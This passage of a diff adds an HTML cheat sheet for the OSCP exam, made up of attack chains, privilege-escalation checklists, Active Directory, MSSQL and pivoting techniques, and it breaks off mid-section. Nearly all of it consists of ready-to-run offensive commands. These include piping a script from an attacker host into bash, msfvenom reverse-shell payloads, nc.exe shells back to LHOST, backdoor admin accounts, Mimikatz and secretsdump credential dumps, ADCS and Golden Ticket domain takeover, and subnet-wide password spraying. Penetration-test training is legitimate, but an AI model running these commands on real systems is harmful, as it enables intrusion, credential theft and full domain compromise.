+<span class="root">Chain G — FTP Anon Write + Webroot Overlap → Shell</span>
+FTP anonymous login → writable dir = /var/www/html/uploads
+→ upload PHP shell → trigger via browser → www-data
+→ capabilities/cron → ROOT
+
+<span class="root">Chain H — SNMP Community → Username → Password Spray → RCE</span>
+snmpwalk → running process with username / installed software version
+→ username found → spray common passwords → SSH/WinRM
+→ SeImpersonate or SUID → ROOT
+
+<span class="root">Chain I — Username as Password (Very Common in OSCP)</span>
+Any service leaks username (SMTP enum, SNMP, web, SMB)
+→ try username:username, username:username123, username:Company1
+→ login → privesc
+
+<span class="root">Chain J — SQLi → OS Shell (MSSQL/MySQL)</span>
+SQLi on login form → xp_cmdshell (MSSQL) or UDF (MySQL)
+→ RCE as service account → SeImpersonate → SYSTEM</div>
+
+  <h3>Linux Privilege Escalation Checklist</h3>
+
+  <pre data-lang="bash"><code># STEP 1: Run linpeas immediately
+curl http://&lt;LHOST&gt;/linpeas.sh | bash 2&gt;/dev/null | tee /tmp/lp.out
+# Look for RED/YELLOW highlights first
+
+# ── Context ──────────────────────────────────────────────────
+whoami &amp;&amp; id &amp;&amp; hostname
+uname -a &amp;&amp; cat /etc/os-release
+env | grep -i "pass\|key\|secret\|token"
+cat ~/.bash_history; cat /home/*/.bash_history 2&gt;/dev/null
+
+# ── Sudo ─────────────────────────────────────────────────────
+sudo -l
+# NOPASSWD → check GTFObins immediately!
+# Common: sudo find . -exec /bin/bash \; -p
+#         sudo python3 -c 'import os; os.system("/bin/bash")'
+#         sudo vim → :!/bin/bash
+
+# ── SUID ─────────────────────────────────────────────────────
+find / -perm -4000 -type f 2&gt;/dev/null | xargs ls -la
+# Each result → GTFObins
+
+# ── Capabilities ─────────────────────────────────────────────
+getcap -r / 2&gt;/dev/null
+# cap_setuid+ep → python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
+
+# ── Cron Jobs ────────────────────────────────────────────────
+cat /etc/crontab; ls -la /etc/cron.d/ /etc/cron.hourly/
+# Writable script run as root → append revshell
+# Wildcard (tar/rsync) → wildcard injection
+
+# ── Writable /etc/passwd ─────────────────────────────────────
+openssl passwd -1 haxpass
+echo 'hax:$1$HASH:0:0:root:/root:/bin/bash' &gt;&gt; /etc/passwd
+su hax
+
+# ── NFS no_root_squash ───────────────────────────────────────
+cat /etc/exports
+# If: /share *(rw,no_root_squash) →
+# On ATTACKER (as root):
+mkdir /mnt/nfs &amp;&amp; mount -t nfs &lt;TARGET_IP&gt;:/share /mnt/nfs
+cp /bin/bash /mnt/nfs/ &amp;&amp; chmod +s /mnt/nfs/bash
+# On VICTIM:
+/tmp/bash -p    # → ROOT
+
+# ── Docker group ─────────────────────────────────────────────
+id | grep docker
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+# ── Internal services ────────────────────────────────────────
+ss -tlnp   # local-only → port forward → exploit</code></pre>
+
+  <h3>Linux PrivEsc Decision Tree</h3>
+  <div class="tree-box"><span class="root">sudo -l</span> → NOPASSWD?
+    └── GTFObins → <span class="win">ROOT ✓</span>
+
+<span class="root">SUID binary?</span>
+    ├── Known binary (GTFObins) → <span class="win">ROOT ✓</span>
+    └── Custom → strings/ltrace → PATH hijack → <span class="win">ROOT ✓</span>
+
+<span class="root">Capabilities?</span>
+    └── cap_setuid → setuid(0) → <span class="win">ROOT ✓</span>
+
+<span class="root">Cron writable script?</span>
+    └── Append reverse shell → <span class="win">ROOT ✓</span>
+
+<span class="root">/etc/passwd writable?</span>
+    └── Add root user → <span class="win">ROOT ✓</span>
+
+<span class="root">NFS no_root_squash?</span>
+    └── Mount + SUID bash → <span class="win">ROOT ✓</span>
+
+<span class="root">Docker group?</span>
+    └── docker run -v /:/mnt → chroot → <span class="win">ROOT ✓</span>
+
+<span class="note">Nothing? → Kernel exploit (check exact version)</span></div>
+
+  <a href="#top" class="back-top">↑ Back to top</a>
+</section>
+
+<!-- ═══════════════════ S4 ═══════════════════ -->
+<section class="section" id="s4">
+  <div class="section-header">
+    <span class="section-num">04</span>
+    <h2>Standalone Windows Box Methodology</h2>
+  </div>
+
+  <h3>Windows Initial Access</h3>
+  <pre data-lang="bash"><code># EternalBlue MS17-010:
+nmap --script smb-vuln-ms17-010 -p 445 &lt;TARGET_IP&gt;
+
+# Tomcat Manager WAR deploy:
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;LHOST&gt; LPORT=4444 -f war -o shell.war
+curl -u admin:admin -T shell.war "http://&lt;IP&gt;:8080/manager/text/deploy?path=/shell"
+curl http://&lt;IP&gt;:8080/shell/
+
+# WebDAV:
+davtest -url http://&lt;TARGET_IP&gt;
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;LHOST&gt; LPORT=4444 -f aspx -o shell.aspx
+curl -T shell.aspx http://&lt;TARGET_IP&gt;/uploads/shell.aspx
+
+# WinRM:
+evil-winrm -i &lt;TARGET_IP&gt; -u Administrator -p 'Password123'
+evil-winrm -i &lt;TARGET_IP&gt; -u Administrator -H &lt;NTLM_HASH&gt;</code></pre>
+
+  <h3>Windows Privilege Escalation</h3>
+
+  <h4>Token Privileges (whoami /priv)</h4>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Privilege</th><th>Exploit Path</th></tr></thead>
+      <tbody>
+        <tr><td>SeImpersonatePrivilege</td><td><span class="impact">GodPotato / PrintSpoofer / JuicyPotatoNG → SYSTEM</span></td></tr>
+        <tr><td>SeAssignPrimaryToken</td><td><span class="impact">GodPotato / JuicyPotato → SYSTEM</span></td></tr>
+        <tr><td>SeBackupPrivilege</td><td><span class="action">Read SAM/NTDS → dump hashes</span></td></tr>
+        <tr><td>SeDebugPrivilege</td><td><span class="action">Dump LSASS → hashes</span></td></tr>
+        <tr><td>SeLoadDriverPrivilege</td><td><span class="impact">Load malicious driver → SYSTEM</span></td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <pre data-lang="powershell"><code># GodPotato (SeImpersonate):
+.\GodPotato-NET4.exe -cmd "cmd /c net user hax Password123! /add &amp;&amp; net localgroup administrators hax /add"
+
+# PrintSpoofer:
+.\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe &lt;LHOST&gt; 4444 -e cmd"
+
+# AlwaysInstallElevated (check BOTH keys = 1):
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;LHOST&gt; LPORT=4444 -f msi -o evil.msi
+msiexec /quiet /qn /i C:\Temp\evil.msi
+
+# Autologon creds in registry:
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+
+# PowerShell history (GOLD MINE):
+type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+# Stored credentials:
+cmdkey /list
+runas /savecred /user:Administrator "C:\Temp\nc.exe &lt;LHOST&gt; 4444 -e cmd"
+
+# Unquoted service paths:
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"</code></pre>
+
+  <h3>Dump Credentials (Windows Post-Exploitation)</h3>
+  <pre data-lang="bash"><code># Mimikatz:
+privilege::debug
+sekurlsa::logonpasswords
+lsadump::sam
+lsadump::lsa /patch
+
+# Remote SAM dump:
+secretsdump.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASS&gt;@&lt;TARGET_IP&gt;
+netexec smb &lt;TARGET_IP&gt; -u user -p pass --sam
+netexec smb &lt;TARGET_IP&gt; -u user -p pass -M lsassy</code></pre>
+
+  <a href="#top" class="back-top">↑ Back to top</a>
+</section>
+
+<!-- ═══════════════════ S5 ═══════════════════ -->
+<section class="section" id="s5">
+  <div class="section-header">
+    <span class="section-num">05</span>
+    <h2>Active Directory Attack Chains</h2>
+  </div>
+
+  <div class="callout red">
+    <strong>⚠ OSCP AD SET IS ASSUMED BREACH.</strong> You receive valid domain credentials at exam start (e.g. <code>stephanie:Password123@corp.local</code>). You are already a low-priv domain user. Enumerate AD immediately.
+  </div>
+
+  <h3>AD Full Attack Flow</h3>
+  <div class="tree-box"><span class="root">PROVIDED CREDS (stephanie:Password123)</span>
+        │
+        ▼
+<span class="leaf">Phase 1: RAPID AD ENUMERATION</span>
+    BloodHound + CME + LDAP + PowerView
+        │
+        ▼
+<span class="leaf">Phase 2: QUICK WINS (all simultaneously)</span>
+    ├── AS-REP Roasting
+    ├── Kerberoasting
+    ├── Passwords in descriptions (VERY COMMON)
+    ├── SMB share hunting
+    └── GPP/SYSVOL passwords
+        │
+        ▼
+<span class="leaf">Phase 3: FOOTHOLD on MS01</span>  (local.txt = 10 pts)
+        │
+        ▼
+<span class="leaf">Phase 4: PIVOT to MS02</span>  (local.txt = 10 pts)
+    Setup Ligolo-ng tunnel → lateral move
+        │
+        ▼
+<span class="leaf">Phase 5: ESCALATE to Domain Admin</span>
+    ACL abuse / DCSync / Delegation / GPO
+        │
+        ▼
+<span class="win">Phase 6: OWN DC</span>  (proof.txt = 20 pts)
+    PSExec/WMIexec as DA → dump NTDS → Golden Ticket</div>
+
+  <h3>Phase 1: AD Enumeration</h3>
+  <pre data-lang="bash"><code># BloodHound — FIRST THING TO RUN:
+bloodhound-python -u stephanie -p 'Password123' \
+    -d corp.local -ns 192.168.x.100 -c All --zip
+# Import ZIP → run queries:
+#   "Find Shortest Paths to Domain Admins"
+#   "Find All Kerberoastable Users"
+#   "Find AS-REP Roastable Users"
+#   "Computers with Unconstrained Delegation"
+#   "Find Principals with DCSync Rights"
+
+# CME domain recon:
+crackmapexec smb 192.168.x.100 -u stephanie -p 'Password123' \
+    --shares --users --groups --pass-pol
+
+# Passwords in description field (VERY COMMON in OSCP):
+ldapsearch -x -H ldap://192.168.x.100 \
+    -D "stephanie@corp.local" -w 'Password123' \
+    -b "DC=corp,DC=local" \
+    "(&amp;(objectClass=user)(description=*))" sAMAccountName description</code></pre>
+
+  <h3>AS-REP Roasting</h3>
+  <pre data-lang="bash"><code>GetNPUsers.py corp.local/stephanie:'Password123' \
+    -dc-ip 192.168.x.100 -request -format hashcat -outputfile asrep.txt
+
+# Windows (Rubeus):
+.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+
+# Crack:
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt</code></pre>
+
+  <h3>Kerberoasting</h3>
+  <pre data-lang="bash"><code>GetUserSPNs.py corp.local/stephanie:'Password123' \
+    -dc-ip 192.168.x.100 -request -outputfile kerb.txt
+
+# Windows (Rubeus):
+.\Rubeus.exe kerberoast /format:hashcat /outfile:kerb.txt
+
+# Crack:
+hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 13100 kerb.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule</code></pre>
+
+  <h3>GPP / SYSVOL</h3>
+  <pre data-lang="bash"><code>crackmapexec smb 192.168.x.100 -u stephanie -p 'Password123' -M gpp_password
+crackmapexec smb 192.168.x.100 -u stephanie -p 'Password123' -M gpp_autologin
+gpp-decrypt &lt;CPASSWORD_VALUE&gt;</code></pre>
+
+  <h3>ADCS — Active Directory Certificate Services</h3>
+
+  <div class="callout red">
+    <strong>⚠ CRITICAL GAP:</strong> ADCS attacks (ESC1-ESC8) are now common in OSCP AD sets. Any domain user can escalate to Domain Admin if misconfigured. Always enumerate ADCS with provided creds.
+  </div>
+
+  <pre data-lang="bash"><code># Enumerate vulnerable templates (run immediately with provided creds):
+certipy find -u 'stephanie@corp.local' -p 'Password123' \
+    -dc-ip 192.168.x.100 -vulnerable -stdout
+
+# Also save BloodHound data:
+certipy find -u 'stephanie@corp.local' -p 'Password123' \
+    -dc-ip 192.168.x.100 -bloodhound
+
+# ── ESC1 — User can specify SAN (most common) ─────────────────
+# Conditions: Enrollee Supplies Subject=True + Client Auth + low-priv enrollment
+certipy req -u 'stephanie@corp.local' -p 'Password123' \
+    -ca corp-CA -template VulnerableTemplate \
+    -upn Administrator@corp.local -dc-ip 192.168.x.100
+# Authenticate with cert → get NTLM hash:
+certipy auth -pfx administrator.pfx -dc-ip 192.168.x.100
+# → Administrator NTLM hash → PTH → Domain Admin!
+
+# ── ESC8 — NTLM Relay to ADCS HTTP endpoint ──────────────────
+# Setup certipy relay:
+certipy relay -target http://&lt;ADCS_IP&gt;/certsrv/certfnsh.asp \
+    -template DomainController
+# Trigger DC authentication (PetitPotam):
+python3 PetitPotam.py -u stephanie -p 'Password123' \
+    &lt;LHOST&gt; &lt;DC_IP&gt;
+# Gets: DC machine certificate → authenticate as DC → DCSync everything
+
+# ── ESC4 — Write access to template ──────────────────────────
+# BloodHound shows WriteProperty on certificate template
+certipy template -u 'stephanie@corp.local' -p 'Password123' \
+    -template VulnTemplate -save-old   # backup original
+certipy template -u 'stephanie@corp.local' -p 'Password123' \
+    -template VulnTemplate -configuration VulnTemplate.json
+# Now request as ESC1
+
+# ── After getting cert → auth → hash → DA ────────────────────
+certipy auth -pfx administrator.pfx -dc-ip 192.168.x.100
+# Hash from output → PTH:
+psexec.py corp.local/Administrator@&lt;DC_IP&gt; -hashes :&lt;NTLM_HASH&gt;
+secretsdump.py corp.local/Administrator@&lt;DC_IP&gt; -hashes :&lt;NTLM_HASH&gt;</code></pre>
+
+  <h3>Shadow Credentials Attack</h3>
+  <pre data-lang="bash"><code># Requires: GenericWrite on target user/computer
+# Check in BloodHound: GenericWrite edges on users or computers
+
+# Add shadow credential to target:
+pywhisker.py -d corp.local -u stephanie -p 'Password123' \
+    --target targetuser --action add --dc-ip 192.168.x.100
+# Gets: pfx file + password
+
+# Authenticate with pfx → get NTLM hash:
+certipy auth -pfx targetuser.pfx -dc-ip 192.168.x.100
+# NTLM hash → PTH or crack → lateral movement</code></pre>
+
+  <h3>AS-REP Roast — Unauthenticated (No Creds Needed)</h3>
+  <pre data-lang="bash"><code># Enumerate users first via RID brute (no creds):
+lookupsid.py corp.local/guest@192.168.x.100 -no-pass 2&gt;/dev/null | grep "SidTypeUser"
+# Or kerbrute:
+kerbrute userenum -d corp.local --dc 192.168.x.100 \
+    /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+
+# Then AS-REP roast without creds:
+GetNPUsers.py corp.local/ -no-pass -usersfile domain_users.txt \
+    -dc-ip 192.168.x.100 -format hashcat
+hashcat -m 18200 asrep.txt rockyou.txt</code></pre>
+
+  <h3>LDAP — Extended Field Enumeration</h3>
+  <pre data-lang="bash"><code># Check description AND info AND comment fields (all can have passwords):
+ldapsearch -x -H ldap://192.168.x.100 \
+    -D "stephanie@corp.local" -w 'Password123' \
+    -b "DC=corp,DC=local" \
+    "(objectClass=user)" sAMAccountName description info comment
+
+# Also check computer accounts for descriptions:
+ldapsearch -x -H ldap://192.168.x.100 \
+    -D "stephanie@corp.local" -w 'Password123' \
+    -b "DC=corp,DC=local" \
+    "(objectClass=computer)" name description</code></pre>
+
+  <h3>MS01 → MS02 — When PTH Fails (Fallback Chain)</h3>
+  <div class="tree-box"><span class="root">PTH to MS02 failed?</span>
+        │
+        ▼
+<span class="leaf">Try in this order:</span>
+1. Kerberoast from MS01 context → crack → try new creds on MS02
+2. MSSQL on MS01 linked to MS02 → xp_cmdshell on MS02 (Section 6)
+3. PS history on MS01 → C:\Users\*\AppData\...\ConsoleHost_history.txt
+4. web.config / app.config on MS01 → DB creds → reuse on MS02
+5. BloodHound: MS01 machine account GenericAll on MS02?
+6. Unconstrained delegation on MS01 → coerce DC → TGT → DCSync
+7. ADCS ESC1/ESC8 → cert as MS02 admin → authenticate
+8. Password spray with ALL found creds/hashes on MS02 services</div>
+
+  <h3>Credential Spray — Across All Services (Chain)</h3>
+  <div class="callout green">
+    <strong>Rule:</strong> Every credential found anywhere must be tried on every service everywhere. Password reuse wins OSCP.
+  </div>
+  <pre data-lang="bash"><code># Any creds found → spray everything:
+netexec smb 192.168.x.0/24 -u user -p pass --continue-on-success
+netexec winrm 192.168.x.0/24 -u user -p pass --continue-on-success
+netexec mssql 192.168.x.0/24 -u user -p pass --continue-on-success
+netexec rdp 192.168.x.0/24 -u user -p pass --continue-on-success
+netexec ssh 192.168.x.0/24 -u user -p pass --continue-on-success
+
+# After getting any hash → spray hash across subnet:
+netexec smb 192.168.x.0/24 -u Administrator -H &lt;NTLM_HASH&gt; \
+    --local-auth --continue-on-success | grep "+"</code></pre>
+
+  <h3>ADCS + AD Attack Decision Tree</h3>
+  <div class="tree-box"><span class="root">Run certipy find immediately with provided creds</span>
+        │
+    ┌───┴──────────────────────┐
+Vulnerable template found?    No ADCS vuln
+    │                              │
+    ▼                         Continue normal AD path
+<span class="leaf">ESC1 → certipy req -upn Administrator</span>
+    │
+    ▼
+<span class="leaf">certipy auth → NTLM hash</span>
+    │
+    ▼
+<span class="win">PTH as Administrator → Domain Admin ✓</span>
+
+ESC8 (HTTP endpoint)?
+→ certipy relay + PetitPotam coerce
+→ DC cert → DCSync → ALL hashes → Golden Ticket</div>
+
+  <h3>Pass-the-Ticket</h3>
+  <pre data-lang="bash"><code># Windows (Rubeus):
+.\Rubeus.exe triage
+.\Rubeus.exe dump /luid:&lt;LUID&gt; /service:krbtgt /nowrap
+.\Rubeus.exe ptt /ticket:&lt;BASE64_TICKET&gt;
+dir \\&lt;TARGET_FQDN&gt;\C$
+
+# Linux:
+export KRB5CCNAME=/tmp/ticket.ccache
+psexec.py -k -no-pass corp.local/administrator@&lt;TARGET_FQDN&gt;</code></pre>
+
+  <h3>Overpass-the-Hash</h3>
+  <pre data-lang="bash"><code># NTLM hash → Kerberos TGT:
+.\Rubeus.exe asktgt /user:user /rc4:&lt;NTLM_HASH&gt; /domain:corp.local /ptt
+
+# Linux:
+getTGT.py corp.local/user -hashes :&lt;NTLM_HASH&gt; -dc-ip 192.168.x.100
+export KRB5CCNAME=user.ccache
+psexec.py -k -no-pass corp.local/user@&lt;TARGET_FQDN&gt;</code></pre>
+
+  <h3>Lateral Movement — Pass-the-Hash</h3>
+  <pre data-lang="bash"><code># Verify hash:
+crackmapexec smb &lt;TARGET_IP&gt; -u Administrator -H &lt;NTLM_HASH&gt; --local-auth
+
+# Spray hash across subnet:
+crackmapexec smb 10.10.10.0/24 -u Administrator -H &lt;NTLM_HASH&gt; \
+    --local-auth --continue-on-success | grep "+"
+
+# Get shell:
+psexec.py corp.local/Administrator@&lt;TARGET_IP&gt; -hashes :&lt;NTLM_HASH&gt;
+wmiexec.py corp.local/Administrator@&lt;TARGET_IP&gt; -hashes :&lt;NTLM_HASH&gt;
+evil-winrm -i &lt;TARGET_IP&gt; -u Administrator -H &lt;NTLM_HASH&gt;</code></pre>
+
+  <h3>DCSync Attack</h3>
+  <pre data-lang="bash"><code>secretsdump.py corp.local/user:'pass'@192.168.x.100 -just-dc
+secretsdump.py corp.local/user:'pass'@192.168.x.100 -just-dc-user krbtgt
+secretsdump.py corp.local/user:'pass'@192.168.x.100 -just-dc-user Administrator
+
+# Mimikatz:
+lsadump::dcsync /user:krbtgt /domain:corp.local
+lsadump::dcsync /all /domain:corp.local</code></pre>
+
+  <h3>ACL Abuse — Common BloodHound Paths</h3>
+  <pre data-lang="bash"><code># GenericAll on User → force password reset:
+Set-DomainUserPassword -Identity targetuser \
+    -AccountPassword (ConvertTo-SecureString 'Hacked123!' -AsPlainText -Force)
+
+# GenericAll on Group → add to Domain Admins:
+Add-DomainGroupMember -Identity "Domain Admins" -Members stephanie
+
+# WriteDACL on Domain → grant DCSync rights:
+Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" \
+    -PrincipalIdentity stephanie -Rights DCSync
+# → now run secretsdump
+
+# GenericAll on Computer → RBCD Attack:
+addcomputer.py -computer-name 'ATTACKPC$' -computer-pass 'Attack123!' \
+    'corp.local/stephanie:Password123' -dc-ip 192.168.x.100
+rbcd.py -delegate-to &lt;TARGET_COMPUTER&gt;$ -delegate-from ATTACKPC$ \
+    -dc-ip 192.168.x.100 -action write 'corp.local/stephanie:Password123'
+getST.py -spn cifs/&lt;TARGET_FQDN&gt; -impersonate Administrator \
+    'corp.local/ATTACKPC$:Attack123!' -dc-ip 192.168.x.100
+export KRB5CCNAME=Administrator@cifs_&lt;TARGET_FQDN&gt;@CORP.LOCAL.ccache
+psexec.py -k -no-pass corp.local/Administrator@&lt;TARGET_FQDN&gt;</code></pre>
+
+  <h3>Golden Ticket</h3>
+  <pre data-lang="bash"><code># Requirements: krbtgt NTLM hash + Domain SID
+ticketer.py -nthash &lt;KRBTGT_NTLM_HASH&gt; \
+    -domain-sid S-1-5-21-XXX-XXX-XXX \
+    -domain corp.local Administrator
+export KRB5CCNAME=Administrator.ccache
+psexec.py -k -no-pass corp.local/Administrator@&lt;DC_FQDN&gt;</code></pre>
+
+  <a href="#top" class="back-top">↑ Back to top</a>
+</section>
+
+<!-- ═══════════════════ S6 ═══════════════════ -->
+<section class="section" id="s6">
+  <div class="section-header">
+    <span class="section-num">06</span>
+    <h2>MSSQL — RCE &amp; Lateral Movement</h2>
+  </div>
+
+  <div class="callout">
+    MSSQL is a <strong>major OSCP attack path</strong>: initial RCE via xp_cmdshell, lateral movement via linked servers, hash capture via UNC injection, privesc via impersonation.
+  </div>
+
+  <h3>Step 1: Connect</h3>
+  <pre data-lang="bash"><code>mssqlclient.py corp.local/sa@&lt;TARGET_IP&gt; -windows-auth
+mssqlclient.py sa@&lt;TARGET_IP&gt;
+mssqlclient.py corp.local/user:'pass'@&lt;TARGET_IP&gt; -windows-auth</code></pre>
+
+  <h3>Step 2: Enumerate</h3>
+  <pre data-lang="sql"><code>SELECT @@version;
+SELECT SYSTEM_USER;
+SELECT IS_SRVROLEMEMBER('sysadmin');    -- 1 = sysadmin!
+SELECT name FROM master.dbo.sysdatabases;
+
+-- Check impersonation rights:
+SELECT distinct b.name FROM sys.server_permissions a
+INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE';
+
+-- Linked servers:
+EXEC sp_linkedservers;
+SELECT srvname, isremote FROM master..sysservers;</code></pre>
+
+  <h3>Step 3: Enable xp_cmdshell → RCE</h3>
+  <pre data-lang="sql"><code>EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+
+EXEC xp_cmdshell 'whoami';
+EXEC xp_cmdshell 'powershell -nop -w hidden -enc &lt;BASE64_PAYLOAD&gt;';
+EXEC xp_cmdshell 'net user hax P@ss123! /add &amp;&amp; net localgroup administrators hax /add';</code></pre>
+
+  <h3>Step 4: Impersonation (non-sysadmin → sysadmin)</h3>
+  <pre data-lang="sql"><code>EXECUTE AS LOGIN = 'sa';
+SELECT IS_SRVROLEMEMBER('sysadmin');   -- Should return 1
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';</code></pre>
+
+  <h3>Step 5: Linked Server Lateral Movement</h3>
+  <pre data-lang="sql"><code>-- Single hop (MS01 → MS02):
+SELECT * FROM OPENQUERY("MS02\SQLEXPRESS", 'SELECT @@version, SYSTEM_USER');
+SELECT * FROM OPENQUERY("MS02\SQLEXPRESS", 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');
+
+-- Execute on linked server:
+EXEC ('xp_cmdshell ''whoami''') AT [MS02\SQLEXPRESS];
+
+-- Enable + RCE on linked server:
+EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [MS02\SQLEXPRESS];
+EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [MS02\SQLEXPRESS];
+EXEC ('xp_cmdshell ''powershell -enc &lt;BASE64&gt;''') AT [MS02\SQLEXPRESS];
+
+-- Double hop (MS01 → MS02 → MS03):
+EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [MS03]') AT [MS02\SQLEXPRESS];</code></pre>
+
+  <h3>Step 6: UNC Path Injection → Hash Capture</h3>
+  <pre data-lang="bash"><code># Setup Responder:
+sudo responder -I tun0 -v
+
+# In MSSQL — trigger UNC auth:
+EXEC xp_dirtree '\\&lt;LHOST&gt;\share';
+EXEC xp_fileexist '\\&lt;LHOST&gt;\share\file';
+
+# Crack captured NetNTLMv2:
+hashcat -m 5600 netntlm.txt /usr/share/wordlists/rockyou.txt
+
+# NTLM Relay (if SMB signing off):
+sudo python3 ntlmrelayx.py -t smb://&lt;TARGET_IP&gt; -smb2support</code></pre>
+
+  <h3>MSSQL Attack Decision Tree</h3>
+  <div class="tree-box"><span class="root">MSSQL Found (port 1433)</span>
+        │
+Try creds: sa:(blank) / sa:sa / sa:password / domain_user:known_pass
+        │
+    ┌───┴──────────┐
+ Sysadmin?      Not sysadmin?
+    │               │
+    │         Check IMPERSONATE rights
+    │         → EXECUTE AS LOGIN='sa'
+    │               │
+    └───────────────┘
+        │
+<span class="leaf">Enable xp_cmdshell → RCE on current server</span>
+        │
+Check linked servers (sp_linkedservers)
+        │
+    ┌───┴─────────────────────────────┐
+No links                       <span class="leaf">Links found</span>
+    │                                │
+    │                        xp_cmdshell on linked
+    │                        → Shell on MS02/DC
+    │
+<span class="note">UNC injection → Responder → crack NetNTLMv2</span></div>
+
+  <a href="#top" class="back-top">↑ Back to top</a>
+</section>
+
+<!-- ═══════════════════ S7 ═══════════════════ -->
+<section class="section" id="s7">
+  <div class="section-header">
+    <span class="section-num">07</span>
+    <h2>Pivoting &amp; Tunneling</h2>
+  </div>
+
+  <h3>Ligolo-ng (Recommended for OSCP)</h3>
+  <pre data-lang="bash"><code># 1. Attacker: create tun interface + start proxy:
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert -laddr 0.0.0.0:11601
+
+# 2. Transfer agent to MS01 → connect:
+# Windows:
+certutil -urlcache -split -f http://&lt;LHOST&gt;/agent.exe agent.exe
+.\agent.exe -connect &lt;LHOST&gt;:11601 -ignore-cert
+
+# 3. In ligolo proxy console:
+session; ifconfig; start
+
+# 4. Add route to internal network:
+sudo ip route add 10.10.10.0/24 dev ligolo
+# Now attack MS02 directly!
+nmap -sV 10.10.10.50
+evil-winrm -i 10.10.10.50 -u user -p pass
+
+# Expose internal port via listener:
+listener_add --addr 0.0.0.0:8080 --to 10.10.10.50:80 --tcp</code></pre>
+
+  <h3>Ligolo-ng Double Pivot (MS01 → MS02 → MS03)</h3>
+  <pre data-lang="bash"><code># After shell on MS02, expose ligolo port via listener on MS01:
+listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
+# On MS02:
+.\agent.exe -connect &lt;MS01_IP&gt;:11601 -ignore-cert
+# New session appears in proxy → start → add route:
+sudo ip route add 172.16.0.0/24 dev ligolo</code></pre>
+
+  <h3>Plink (Windows — no SSH client)</h3>
+  <pre data-lang="bash"><code>certutil -urlcache -split -f http://&lt;LHOST&gt;/plink.exe plink.exe
+cmd /c echo y | .\plink.exe -ssh -l root -pw &lt;SSH_PASS&gt; \
+    -R 127.0.0.1:4455:127.0.0.1:445 &lt;LHOST&gt;
+# Attacker's 4455 → victim's 445</code></pre>
+
+  <h3>Chisel</h3>
+  <pre data-lang="bash"><code># Attacker:
+./chisel server -p 8888 --reverse
+
+# Victim:
+.\chisel.exe client &lt;LHOST&gt;:8888 R:socks
+# /etc/proxychains4.conf: socks5 127.0.0.1 1080
+proxychains nmap -sT -Pn 10.10.10.50
+proxychains evil-winrm -i 10.10.10.50 -u user -p pass</code></pre>
+
+  <h3>SSH Tunneling</h3>
+  <pre data-lang="bash"><code># Local port forward:
+ssh -L 3389:10.10.10.50:3389 user@&lt;MS01_IP&gt;
+xfreerdp /v:localhost:3389 /u:user /p:pass
+
+# Dynamic SOCKS:
+ssh -D 1080 -N user@&lt;MS01_IP&gt;
+proxychains nmap -sT -Pn 10.10.10.0/24</code></pre>
+
+  <a href="#top" class="back-top">↑ Back to top</a>
+</section>
+
+<!-- ═══════════════════ S8 ═══════════════════ -->
+<section class="section" id="s8">
+  <div class="section-header">
+    <span class="section-num">08</span>
+    <h2>Password Attacks</h2>
+  </div>
+
+  <h3>Hashcat Modes Reference</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Mode</th><th>Hash Type</th><th>Use Case</th></tr></thead>
+      <tbody>
+        <tr><td>1000</td><td>NTLM</td><td>Windows local hashes</td></tr>
+        <tr><td>5600</td><td>NetNTLMv2</td><td>Responder captures</td></tr>
+        <tr><td>5500</td><td>NetNTLMv1</td><td>Older captures</td></tr>
+        <tr><td>13100</td><td>Kerberoast TGS-REP</td><td>SPN hash crack</td></tr>
+        <tr><td>18200</td><td>AS-REP Roast</td><td>AS-REP hash crack</td></tr>
+        <tr><td>1800</td><td>SHA512crypt $6$</td><td>Linux /etc/shadow</td></tr>
+        <tr><td>500</td><td>MD5crypt $1$</td><td>Linux shadow (older)</td></tr>
+        <tr><td>3200</td><td>bcrypt $2y$</td><td>Modern Linux/web</td></tr>
+        <tr><td>0</td><td>MD5</td><td>Web app hashes</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <pre data-lang="bash"><code>hashcat -m 1000 ntlm.txt rockyou.txt
+hashcat -m 5600 netntlm.txt rockyou.txt
+hashcat -m 13100 tgs.txt rockyou.txt -r rules/best64.rule
+hashcat -m 18200 asrep.txt rockyou.txt
+hashcat -m 1800 shadow.txt rockyou.txt</code></pre>
+
+  <h3>NTLM Capture &amp; Relay</h3>
+  <pre data-lang="bash"><code># Capture (Responder):
+sudo responder -I tun0 -dwv
+hashcat -m 5600 Responder/logs/HTTP-NTLMv2-*.txt rockyou.txt
+
+# Check signing:
+netexec smb &lt;SUBNET&gt;/24 --gen-relay-list unsigned.txt
+
+# Relay:
